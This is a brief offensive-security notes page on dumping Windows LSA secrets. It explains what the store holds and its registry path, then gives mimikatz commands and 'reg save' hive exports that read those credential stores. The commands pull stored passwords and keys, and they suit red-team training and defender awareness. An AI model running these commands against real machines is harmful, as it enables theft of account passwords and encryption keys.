# Dumping LSA Secrets

> #### **What is stored in LSA secrets?**
>
> Originally, the secrets contained cached domain records. Later, Windows developers expanded the application area for the storage. At this moment, they can store PC users' text passwords, service account passwords (for example, those that must be run by a certain user to perform certain tasks), Internet Explorer passwords, RAS connection passwords, SQL and CISCO passwords, SYSTEM account passwords, private user data like EFS encryption keys, and a lot more. For example, the _NL$KM_ secret contains the cached domain password encryption key.

## Storage

LSA Secrets are stored in registry:

```
HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
```

![[Screenshot from 2019-03-12 20-20-39.png]]

## Execution

### Memory

Secrets can be dumped from memory like so:

```
// attacker@mimikatz
token::elevate
lsadump::secrets
```

![[Screenshot from 2019-03-12 20-25-01.png]]

### Registry

LSA secrets can be dumped from registry hives likes so:

```csharp
// attacker@victim
reg save HKLM\SYSTEM system & reg save HKLM\security security
```

![[Screenshot from 2019-03-12 20-37-11.png]]

```csharp
// attacker@mimikatz
lsadump::secrets /system:c:\temp\system /security:c:\temp\security
```

![[Screenshot from 2019-03-12 20-38-02.png]]

## References

[www.passcape.com/index.php?section=docsys&cmd=details&id=23](https://www.passcape.com/index.php?section=docsys&cmd=details&id=23)

